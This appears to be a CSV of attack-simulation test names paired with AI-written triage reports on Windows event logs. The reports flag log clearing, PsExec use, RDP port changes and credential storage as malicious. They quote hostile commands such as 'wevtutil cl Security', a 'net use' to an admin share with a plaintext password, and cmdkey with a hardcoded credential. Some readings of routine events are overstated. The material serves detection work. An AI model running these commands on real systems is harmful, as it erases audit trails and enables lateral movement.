Directory Name,AI Response
Map admin share,"Upon analyzing the provided Windows event logs, several indicators suggest suspicious activity that warrants further investigation. Here's a breakdown of the findings:

### Suspicious or Anomalous Behavior:

1. **Clearing of Event Logs:**
   - Multiple instances of log clearing are captured in the logs:
     - `EventID 104` in the System log for the ""System"" channel.
     - `EventID 104` for the ""Windows PowerShell"" channel.

   - `EventID 1102` in the Security log indicates that the security log was cleared.

   Clearing event logs, especially security-related logs, is a common tactic employed by threat actors to cover their tracks post-compromise.

2. **Unauthorized Command Execution:**
   - The execution of `cmd.exe` to map a network share using credentials (`net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator`) is captured in the logs. This could represent lateral movement or unauthorized access to network resources using privileged credentials.

3. **Use of Powerful Privileges:**
   - The `admin_test` account had privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, and others, which are typically associated with high-level administrative activities. The presence of these privileges raises the possibility of privilege misuse or escalation.

### Assessment:

The combination of event log clearing and suspicious network share mounting using administrator privileges strongly suggests that malicious activities are likely occurring.

- **Log Clearing:** This action, particularly when involving security logs, raises immediate red flags as it implies a deliberate attempt to obfuscate malicious actions.
- **Network Share Access with Admin Credentials:** The command `net use` to map network drives with administrator credentials suggests unauthorized access or infrastructure enumeration intentions potentially marking a lateral movement attempt.

### Guidance and Resolution:

Given the activities observed, especially the clearing of various logs and unauthorized credential use, the situation should be treated as potentially **MALICIOUS**:

1. **Immediate Actions:**
   - **Isolate the System:** Temporarily remove the affected host from the network to prevent further spread or data exfiltration.
   - **Account Auditing:** Review any use of high-privilege accounts (`admin_test`) across the network.
   - **Credential Reset:** Force a reset of all relevant administrative credentials, especially those detected in suspicious activities.

2. **In-Depth Investigation Required:**
   - **Forensic Analysis:** Conduct a comprehensive forensic analysis to determine the extent of the compromise and any potential data loss.
   - **Network Traffic Analysis:** Review network logs for indications of data exfiltration or communications with malicious external IPs.

3. **System Hardening:**
   - Implement stricter logging controls and monitor any further instances of log tampering.
   - Review and minimize account privileges following a principle of least privilege.

This situation demands immediate and thorough actions to ensure containment and an assurance of security posture post-incident."
Radmin Viewer Utility,"After analyzing the provided event logs from the Windows machine, here is a detailed assessment of the situation:

1. **Process Execution Analysis**:
   - There are multiple logs showing executions of legitimate Microsoft processes such as `MicrosoftEdgeUpdate.exe`. These processes are associated with Microsoft Edge updates and appear to be operating under the `NT AUTHORITY\SYSTEM` context, which is typical for system updates carried out by Microsoft software.
   
2. **Use of `wevtutil.exe`**:
   - The logs contain multiple entries for the execution of `wevtutil.exe` (Windows Event Command Line Utility) by the `admin_test` user. The process is used for clearing log files: `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, and `cl ""Windows PowerShell""`.
   - This activity is suspicious as `wevtutil.exe` is being used to clear critical event logs, possibly as an attempt to hide malicious activity.

3. **`cmd.exe` Execution**:
   - There is an instance of `cmd.exe` executing with the command line `""cmd.exe"" /c ""%%PROGRAMFILES(x86)%%/Radmin Viewer 3/Radmin.exe""`. This command is directed towards executing `Radmin.exe`, a known remote administration tool.
   - While Radmin can be used legitimately, its presence in this context may indicate unauthorized remote access, especially if the installation of Radmin was not sanctioned by company policies.

4. **Log Clearing**:
   - The system and security logs show events indicating they have been cleared by the `admin_test` user. This is a classic sign of activity trying to cover tracks and prevent detection of malicious actions.

5. **Absence of Non-Benign PowerShell Event**:
   - Although PowerShell is present in the logs, there are no specific commands or scripts captured which could directly show malicious intent. However, the absence of detailed PowerShell event logs due to their clearance highlights suspicious behavior.

Given these observations, the activity surrounding the clearing of event logs, use of `wevtutil.exe`, execution of `Radmin.exe`, and the clearing of logs by `admin_test` suggests an attempt to obfuscate potentially unauthorized or malicious actions. These behaviors align more closely with tactics used to maintain persistence and cover tracks within compromised environments.

**Conclusion**:
The conclusion based on the analysis is that the logs contain activity indicative of potential compromise, thus categorized as:

- **Resolution: MALICIOUS**

**Guidance**:
- Immediate containment actions are advised, including isolating the host from the network to prevent further remote access or data exfiltration.
- Conduct a thorough investigation to determine the scope and origin of the compromise, including examining any remote access tools installed.
- Review the `admin_test` user's activity and credentials, and consider resetting credentials or disabling the account until the investigation is concluded.
- Restore System, Security, and Application logs from backups if possible to gather more context about the cleared activity.
- Increase monitoring and ensure all security patches and antivirus definitions are up to date."
Map Admin Share PowerShell,"### Analysis of Logs

Upon reviewing the provided logs, several events indicate potentially malicious activities on a Windows machine, specifically focusing on log file clearing events, command execution, and user activity.

#### Suspicious Activities:
1. **Log File Clearing Events:**
   - The `EventID 104` in the System logs reports that the logs for the System and Windows PowerShell were cleared by the user `admin_test` at `2024-10-21 11:08:24`. Similarly, the `Security log` is cleared right after, as noted by `EventID 1102`.
   - Clearing logs is often performed to cover tracks after unauthorized or suspicious activity, suggesting an attempt to obstruct forensic investigations.

2. **Command Execution and Process Activity:**
   - **PowerShell Commands:** There are multiple PowerShell events (EventID 600) indicating execution of a command creating a new PSDrive that points to a network path (`\\Target\\C$`). This action is suspicious as it could be an attempt to access or exfiltrate data from the target system.
   - **Wevtutil Exe Usage:** In the Sysmon logs, several entries show the execution of `wevtutil.exe` to clear logs (`ProcessId 6052, 5688, 5884`). This further supports the hypothesis that there's an effort to hide malicious actions on this system.
   - **Repeated Execution of Administrative Tasks:** There are multiple logons (EventID 4624) and special privilege assignments (EventID 4672) for `admin_test` within the same timeframe, indicating the possibility of privilege escalation or lateral movement.

3. **Time Manipulation:**
   - Logs indicate changes in system time (`EventID 4616`) issued by `svchost.exe`, which can disrupt log timelines and complicate investigations.

#### Indicators of Malicious Intent:
- **Log Tampering:** Frequent clearing of logs by `admin_test` is a major red flag pointing towards intentions to cover up malicious activities.
- **Unusual PowerShell Execution:** Execution of commands that create network shares or access paths to other systems suggests unauthorized access attempts.
- **Privilege Escalation:** The acquisition of multiple high-level privileges (e.g., `SeDebugPrivilege`) indicates the presence of actions requiring elevated permissions and suggests possible privilege escalation.

### Assessment
Considering the frequent log clearing activities, suspicious PowerShell usage, and privilege escalation attempts, the logs provide strong indications of potentially malicious activity occurring on the system. The actions observed are characteristic of an attacker trying to cover their tracks post-activity execution.

### Resolution
- **MALICIOUS**

### Recommendations for Further Action:
1. **Isolate the Host:** Immediately isolate the affected machine (Server002) from the network to prevent further compromise.
2. **Conduct Detailed Forensics:** Perform a thorough forensic analysis to determine the extent of the intrusion and data accessed or exfiltrated.
3. **Review and Harden Security Protocols:** Review and strengthen security controls, including log monitoring, PowerShell execution policies, and user privilege management.
4. **Network Monitoring and Incident Response:** Enhance network monitoring for any indications of further intrusion attempts and establish an incident response to address any potential breaches quickly.

These measures will help mitigate any present threats and prevent future incidents of a similar nature."
Exfiltration Over SMB over QUIC (New-SmbMapping),"Based on the provided log entries, here's a detailed analysis focusing on identifying any potential indicators of malicious activity:

### Summary of Logs:
1. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` being executed with the `cl` (clear logs) command for various logs (e.g., Sysmon, Application, System, Security, and Windows PowerShell).
   - Logs cleared while a high-integrity process was initiated from the `admin_test` user.

2. **Security Logs**:
   - Event ID 1102, which indicates that the security log was cleared. This can be a critical indicator of malicious intent as log clearing is often done to cover tracks after unauthorized or suspicious activities.

3. **PowerShell Logs**:
   - Recorded execution of a PowerShell command to map a network drive and copy files. The connection uses the QUIC protocol with `-SkipCertificateCheck`, which may indicate suspicious activity if not clearly authorized, as it bypasses security checks.
   - The connection to a potentially suspicious network path without proper security checks.

4. **Application Logs**:
   - Various Edge Update operations; typically benign, except that they coincide with other suspicious activities (log clearing).

5. **System Logs**:
   - Cleared logs across various channels (System, Windows PowerShell).

### Assessment of Malicious Activity:
- **Indicators of Malicious Activity**:
  - **Log Clearing**: The clearing of all primary logs (Sysmon, Application, Security, System, and Windows PowerShell) is highly suspicious, often indicating an attempt to hide malicious activity.
  - **PowerShell Command**: The use of PowerShell with parameters that skip certificate checks and map a network drive.
  - **Execution of `wevtutil.exe`**: This often precedes log deletion which, when linked to a non-routine context or without prior approval, is suspicious.

- **Potential Threats/Risks**:
  - High risk of unauthorized access, data exfiltration, or compromise of integrity as evidenced by logs being deliberately cleared.
  - Possible lateral movement or persistence attempts using PowerShell.

### Guidance:
- **Immense Priority**: Immediately conduct a more complete forensic investigation.
- **Containment**: Restrict network access from the involved host (Server002) and monitor traffic for unusual patterns.
- **Host Review**: Analyze the affected system for malware or signs of compromise (e.g., unrecognized scheduled tasks, scripts, or unusual outbound connections).
- **User Activity Audit**: Review other activities related to the `admin_test` user across systems.

### Resolution:
- **Resolution**: Based on the preponderance of evidence suggesting deliberate log clearing and potentially suspicious PowerShell activities, this case is determined to be **MALICIOUS**. Immediate investigation and incident response measures are warranted."
Copy and Execute File with PsExec,"Upon analyzing the provided logs, several events stand out that could be indicative of malicious activity or unusual behavior on the host:

**1. Log Clearance Events:**
- In the Security log and System logs, there are multiple instances where logs have been cleared (`EventID: 1102` in Security, and `EventID: 104` in System). This action was performed by a user with the username `admin_test`. Log clearance events can be suspicious because attackers often clear logs to cover their tracks after gaining unauthorized access.

**2. Execution of PsExec:**
- The Sysmon log shows the execution of `PsExec.exe` from `C:\Users\ADMIN_~1\AppData\Local\Temp\ExternalPayloads\`. PsExec is a legitimate Microsoft utility used to execute processes on remote systems, but it is commonly used by attackers to move laterally or execute arbitrary commands on remote systems.

**3. Creation of PsExec Service:**
- A new service called `PSEXESVC` was installed with `PSEXESVC.exe` as its image path, which further indicates that PsExec was used. The creation of this service suggests remote execution activity that may have been unauthorized.

**4. Privilege Use and User Activity:**
- Multiple privilege assignment events are logged for the user `admin_test` with highly sensitive privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeBackupPrivilege`. These are high-level privileges usually not granted to regular users and can be a sign of privilege escalation.

**5. Unusual Command-Line Usage:**
- The use of `wevtutil.exe` to clear logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, `cl ""Windows PowerShell""`) by `admin_test` is observed. This is a clear indicator of attempts to erase forensic data, typically seen in post-exploitation scenarios.

**6. Elevated Token Activity:**
- The user `admin_test` was granted elevated tokens several times within short periods. Elevated tokens allow a user process to perform actions that require administrative permissions, which can point to privilege escalation tactics.

The combination of these activities strongly suggests that the system may have been compromised and is being used for unauthorized activity. Below is the final assessment:

**Resolution: MALICIOUS**

**Threats and Risks Identified:**
- Unauthorized log clearance and use of PsExec suggest malicious intent, possibly indicating that the system is being used by an attacker who has gained elevated access.
- Privilege escalation and misuse of administrative-level privileges pose significant risk to the integrity and confidentiality of the system.
- Potential remote execution of code and lateral movement could compromise additional systems or data.

**Guidance:**
1. **Isolate the Host:** Immediately isolate the affected host from the network to prevent further potential compromise.
2. **Conduct Further Investigation:** Utilize other forensic methods to gather additional evidence and determine the extent of the compromise.
3. **Review Access Logs:** Check for other systems that `admin_test` or the IP address `fe80::e3b5:5371:12a8:9c77` may have accessed.
4. **Change Credentials:** Promptly reset credentials for `admin_test` and review all credentials for unauthorized access.
5. **Rebuild or Clean System:** Consider fully rebuilding the system from a known clean state or conduct a thorough clean-up while ensuring the elimination of potential backdoors.
6. **Enhance Monitoring and Logging:** Bolster monitoring on critical systems to detect unusual activities and prevent a recurrence. 

These steps should help in stopping ongoing malicious activities and preventing further exploitation of the system."
Changing RDP Port to Non Standard Port via Powershell,"Upon analyzing the provided event logs from the Windows host, several indicators suggest potential malicious activity:

### Detailed Analysis:

1. **Event Log Clearing:**
   - **Security EventID 1102** and **System EventID 104** indicate the security, system, and PowerShell logs being cleared. This is a typical action taken by an attacker to cover tracks after performing unauthorized activities on a system.
   - The user `admin_test` executed these log-clearing commands, suggesting that a user with administrative privileges was used for this purpose.

2. **Anomalous Use of Tools:**
   - **Sysmon EventID 1 and 5** show the execution of `wevtutil.exe` to clear logs, corroborated by command lines like `""C:\\Windows\\system32\\wevtutil.exe"" cl ""Security""` and other relevant channels. `wevtutil` is a legitimate utility but its use in this context (especially combined with cleared logs) suggests malicious intent.
   - **Use of PowerShell**: The presence of a PowerShell process modifying the RDP port (`Set-ItemProperty`) and adding a new firewall rule (`New-NetFirewallRule`) to allow inbound traffic on this new port is highly suspicious. This action directly indicates an attempt to set up unauthorized remote access.

3. **Process Creation and Execution:**
   - Multiple `whoami.exe` and `conhost.exe` executions are recorded. While standalone executions might be normal, their frequent invocation in rapid succession might be part of a script or malware. However, this by itself is not definitive without other corroborating evidence.

4. **Credential and Process Auditing Failures:**
   - **Security EventID 5379** shows repeated failed credential access attempts, evidenced by the `ReturnCode: 3221226021`, which translates to ""An attempt was made to reference a token that does not exist."" While normally part of audit noise, in conjunction with other malicious indicators, it can suggest unauthorized attempts to access credentials or perform operations using non-existent tokens.

### Assessment

Combining the log clearing with the suspicious PowerShell activity and attempts at changing RDP configurations, it is clear that someone with malicious intent could have been attempting to establish persistent remote access to the system while erasing tracks of such activities. The actions taken on this machine align with common post-exploitation steps seen in security incidents.

### Conclusion

The analysis leads to a resolution of **MALICIOUS** activity based on:
- Log clearing events by a user with administrative privileges.
- Unauthorized modification of critical RDP settings and firewall rules using PowerShell.
- Evidence of suspicious behavior aiming to obscure visibility on the system.

### Recommended Actions:

1. **Immediate Isolation**: Disconnect `Server002` from the network to prevent potential lateral movement or further exfiltration activities.
2. **Full Forensic Analysis**: Conduct a thorough forensic investigation, reviewing memory dumps, file changes, and further event logs from any connected systems.
3. **Review and Change Credentials**: Update credentials used on this machine, particularly those with administrative privileges, and investigate any potential compromises.
4. **Identify Persistence Mechanisms**: Check for scheduled tasks, registry changes, and startup file alterations that may offer persistence to the attacker.
5. **Audit Remote Access Configurations**: Ensure RDP and other remote access methods are appropriately authorized and logged.
6. **Enhance Monitoring**: Strengthen logging and monitoring capabilities to catch such activities earlier in the kill chain."
PDQ Deploy RAT,"Upon analyzing the provided logs, we can draw the following insights into whether there is malicious activity:

### Suspicious or Anomalous Behavior:

1. **Log File Clearing Events**:
   - Multiple logs, particularly the Security, System, and Windows PowerShell logs, have been cleared almost simultaneously by the same user (`admin_test`). This can be observed from the events with IDs like `1102` in Security log and `104` in System log. Clearing logs is a known tactic used by attackers to cover their tracks.

2. **Command Execution**:
   - The execution of `wevtutil.exe cl` commands is used for clearing event logs (Sysmon EventID 1 and 5). These actions are recorded in the Sysmon logs and corroborate the event log clearing activities.
   - The use of PowerShell to download and execute software (`PDQ Deploy`) in a silent mode is noted. The script downloads a file from an external URL and installs it without user notification which could be suspicious, especially in environments where such activities are not common or authorized.

3. **Unusual Installations with Elevated Privileges**:
   - The installation of `PDQ Deploy` using administrative privileges appears peculiar given the context and the attempt to obscure this activity by clearing logs afterward.
   
4. **Use of PowerShell**:
   - Several events indicate the execution of PowerShell commands (`powershell.exe -ExecutionPolicy Restricted`) which are not inherently malicious but are noteworthy if they deviate from typical administrative tasks or are used excessively to download and execute potentially harmful payloads.

### Malicious Indications:

- **Log Clearing**: The deliberate erasure of logs suggests potential malicious activity, especially as it coincides with the installation and execution of a potentially unauthorized application (`PDQ Deploy`) sourced from an external download.
  
- **External Payload Execution**: The downloading and execution of the PDQ Deploy installer could be a method for deploying further payloads or gaining control of the system, although PDQ Deploy itself is legitimate software, how it's being used here raises red flags.

### Assessment:

Given the series of events, we have identified several indicators suggestive of potentially malicious activities — particularly the simultaneous clearing of event logs, downloading, and silent installation of external software.

### Resolution: **MALICIOUS**

**Guidance:**
1. **Immediate Containment**: Halt any ongoing suspicious processes and block any potential command and control communications.
   
2. **Full System Audit and Investigation**: Conduct a thorough examination to determine the extent of the compromise, inspect system integrity, examine any persistent memory or file-based malicious artifacts.

3. **User Activity Review**: Investigate the actions and intent of user `admin_test` to establish whether these actions were intentional and authorized or indicative of compromised credentials.

4. **Policy and Access Review**: Review and strengthen administrative access policies to prevent unauthorized use of privileged accounts in the future.

5. **System Restoration**: Consider restoring the system from a secure backup to ensure all potential backdoors installed are removed.

6. **Enhance Monitoring**: Implement heightened monitoring for further indicators of compromise including unusual user activities or command executions."
Deploy 7-Zip Using Chocolatey,"Upon reviewing the provided Windows event logs, the following points stand out:

1. **EdgeUpdate Activity**:
   - There are several instances of `MicrosoftEdgeUpdate.exe` being executed, which are part of the Microsoft Edge update process. The activity includes running setup executables and registration executables, which suggest an update process is occurring.
   - The ParentUser is `NT AUTHORITY\SYSTEM`, which is normal for system updates, indicating these processes are executed with appropriate privileges.

2. **PowerShell Activity**:
   - A PowerShell script is executed to install 7-Zip using Chocolatey (`choco install -y 7zip`). This action seems authorized as the user `SERVER002\admin_test` is executing this script. However, installation of software through PowerShell, especially using third-party package managers like Chocolatey, should be monitored in environments where such actions are restricted.

3. **Log Clearing**:
   - The security and system logs are cleared around `2024-10-23 16:02:00`. The clearing of logs is a red flag and suggests potential attempts to cover up malicious activity. The user who cleared the logs is `SERVER002\admin_test`.

4. **wevtutil.exe**:
   - Invocation of `wevtutil.exe` to clear event log channels (Microsoft-Windows-Sysmon/Operational, Application, etc.) is recorded, which aligns with the log clearing activity.

5. **Security Log Clearing (Event ID 1102)**:
   - The security log being cleared by `admin_test` (`UserId: S-1-5-21-3962163828-2803415714-1403596700-1006`) with `ClientProcessId: 7072` raises suspicion further. Log clearing could indicate malicious behavior as it is often used to cover tracks post-compromise.

**Summary and Resolution**:
- **BENIGN** activities include the routine Microsoft Edge updates.
- **SUSPICIOUS** activities include:
  - The use of PowerShell to install software if it is not standard practice in the environment, especially using third-party tools like Chocolatey.
  - The clearing of system logs, which suggests deliberate removal of logs, potentially to hide unauthorized actions.

Given the actions involving log clearing, especially the security logs, this activity suggests potential malicious intent, warranting further investigation.

**Final Resolution**: **SUSPICIOUS**.

**Guidance**: Immediate action should include:
  - Further investigation into `admin_test`'s activities, especially around the time of log clearing.
  - Verification if the PowerShell script execution and software installation were authorized.
  - Ensure all endpoints and logs are monitored more rigorously, and additional controls are put in place to prevent unauthorized software installation and log clearing in the future."
Changing RDP Port to Non Standard Port via Command_Prompt,"Upon reviewing the provided logs, there are several events that stand out as potentially suspicious or indicative of malicious activity:

1. **Event Log Clearing**: 
   - The event log indicates multiple entries of logs being cleared by a user, `admin_test`. Evidence of logs being cleared is often an indication of attempting to hide malicious activity.
   - Specifically, event IDs 1102 and 104 (Security and System logs, respectively) show the use of `wevtutil.exe` to clear logs, which is questionable when done without apparent legitimate reasoning.

2. **Privilege Escalation and Abnormal Access**:
   - Event ID 4672 shows the account `admin_test` receiving a set of elevated privileges, such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`. These privileges are not typically necessary for most administrative tasks and can suggest an attempt to escalate privileges or perform unauthorized actions.
   - Additionally, the logon type 3 for `admin_test` indicates network logons, which could be legitimate, but coupled with other observations, this raises suspicion.

3. **System Time Change**:
   - Events 4616 and related show a system time alteration (`NewTime` being set to an earlier time), potentially to confuse logging timestamps or circumvent restrictions based on time, such as scheduled tasks or log rotation with time windows.
   - Time changes by `svchost.exe`, a common Windows process, could be anomalous without a legitimate cause explained by related system updates or similar legitimate operations.

4. **Unusual Commands Executed**:
   - The Sysmon logs identify `cmd.exe` executing a command to change the RDP port and make firewall changes (`reg.exe` and `netsh.exe` modifying the RDP port to 4489) which might suggest an unauthorized attempt to establish persistence by modifying network configurations injudiciously.

5. **Edge Installations**:
   - Multiple Edge-related setup operations are noted. While remarkably intricate, they align with system-level updates and installations. However, when viewed along with other suspicious activities, this behavior warrants further inspection for assurance.

**Assessment**:
Based on these observations, I categorize this activity as **MALICIOUS**. The combination of log clearing, privilege escalation, attempts to modify system configurations illicitly, and unusual process executions points toward a potential compromise or an active attempt to obscure unauthorized actions.

**Recommended Actions**:
- Immediately isolate the affected system to prevent further unauthorized access.
- Conduct a comprehensive forensic investigation to identify all access points and compromised accounts.
- Change all credentials, especially for `admin_test`.
- Review security policies, especially related to log retention, user privilege management, and monitoring.
- Backtrace any network connections established to understand potential data exfiltration.
- Reassess security measures for RDP and other remote access protocols."
RDP to DomainController,"Based on the provided log entries from various sources such as the Security, System, Sysmon, and Windows PowerShell logs, here is the analysis:

### Suspicious and Anomalous Behavior:

1. **Clearing of Event Logs:**
   - Security event log ID 1102 indicates that the logs have been cleared.
   - System event log ID 104 also shows log clearance across System, Security, and Windows PowerShell channels.
   - These actions were executed by the user `admin_test`.
   - Clearing event logs is typically performed to cover tracks after malicious activities.

2. **Process Executions:**
   - **Sysmon logs show the execution of `wevtutil.exe`** for clearing logs with specific command lines (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, `cl ""Windows PowerShell""`).
   - **Execution of `cmdkey.exe`** with command line to store credentials using a hardcoded password in PowerShell.
   - **Execution of `powershell.exe`** with a command sequence that includes the use of `cmdkey` and establishing an RDP connection using potentially sensitive credentials (`1password2!`).

3. **Privilege and Account Use:**
   - High integrity levels during execution indicate elevated privileges were used.
   - The logs reflect the user `SERVER002\admin_test` executing potentially harmful commands.

4. **Potential Credential Theft:**
   - The use of `cmdkey.exe` suggests that credentials for a terminal service connection were created, which is not standard behavior for administrative tasks and indicates potential lateral movement or persistence mechanism setup.

### Assessment:
The combination of log clearance activities, use of administrative tools with high privileges, potentially malicious PowerShell script usage, and storing credentials with `cmdkey.exe` strongly suggests attempts to cover tracks and prepare the system for remote access or lateral movement. 

### Resolution:
**MALICIOUS** - The log activities constitute malicious behavior. The execution of commands and systems through command prompt and PowerShell to clear logs, manage credentials, and potentially establish unauthorized remote connections align closely with known attack patterns, such as persistence and defense evasion.

### Guidance:
1. **Immediate Action:** 
   - Disconnect the affected system from the network to prevent further compromise.
   - Conduct a thorough forensic analysis to identify other potentially compromised systems.
   
2. **Investigate User Accounts:**
   - Reset credentials for the `admin_test` user and other potentially compromised accounts.
   - Review account usages and privileges to ensure least privilege principle.

3. **Enhance Monitoring:**
   - Implement increased monitoring on event log activities and detect attempts to clear them.
   - Ensure that logging policies are enforced and appropriately audited.

4. **Incident Response:**
   - Follow incident response protocols, collect evidence, and review the full scope of potential breaches.
   - Consider engaging an incident response team for detailed investigation and remediation specific to this incident.

5. **Security Awareness:**
   - Enhance security training related to abnormal activities and misuse of administrative tools.
   - Foster a security-conscious culture to prevent succumbing to spear-phishing or credential theft techniques."
PowerShell Lateral Movement Using Excel Application Object,"Upon reviewing the provided event logs, a few key observations indicate suspicious and potentially malicious activities:

1. **Event Log Clearing**: 
   - Multiple events indicate the clearing of logs across different channels (System, Windows PowerShell, and Security) using `wevtutil.exe`. This occurred within a very short time frame, suggesting an attempt to cover tracks, a common behavior in malicious activities.

2. **PowerShell Execution**:
   - The PowerShell logs show an unusual command execution involving copying `calc.exe` to a different location and attempting to invoke Excel via COM objects. The mechanism and purpose of this script are unclear, but its execution coincides with the time of log clear activities, raising suspicion.

3. **Process Execution via Sysmon**:
   - The Sysmon logs reveal the execution of `wevtutil.exe` commands to clear logs almost simultaneously, executed by the same user `SERVER002\\admin_test` with a high integrity level. This deliberate user action again suggests an attempt at hiding activities on the system.

4. **Unusual Command Lines**:
   - The command lines seen in PowerShell and Sysmon logs do not align with typical administrative or maintenance tasks. They indicate potential misuse of system utilities for malicious purposes.

5. **System Integrity and Legitimacy**:
   - Although Microsoft system updates and scheduled tasks are visible, the simultaneous appearance with the suspect actions underlines a planned execution strategy, potentially leveraging legitimate system operations as a decoy.

Based on these findings, especially the log clearing actions coupled with anomalous PowerShell and process activities, the analysis, like in scenarios involving unauthorized access and tampering, leads to a resolution that designates this activity as:

**MALICIOUS**

**Guidance on Proceeding:**
- Isolate the affected system (Server002) from the network to prevent further unauthorized access.
- Conduct a thorough forensic investigation to determine the origin and scope of the compromise.
- Review user accounts, especially `admin_test`, for any unauthorized access and change credentials immediately.
- Examine scheduled tasks, startup scripts, and Group Policy settings for unauthorized or malicious modifications.
- Deploy enhanced monitoring on the network for any lateral movement indicators.
- Consider working with a security incident response team for remedial actions."
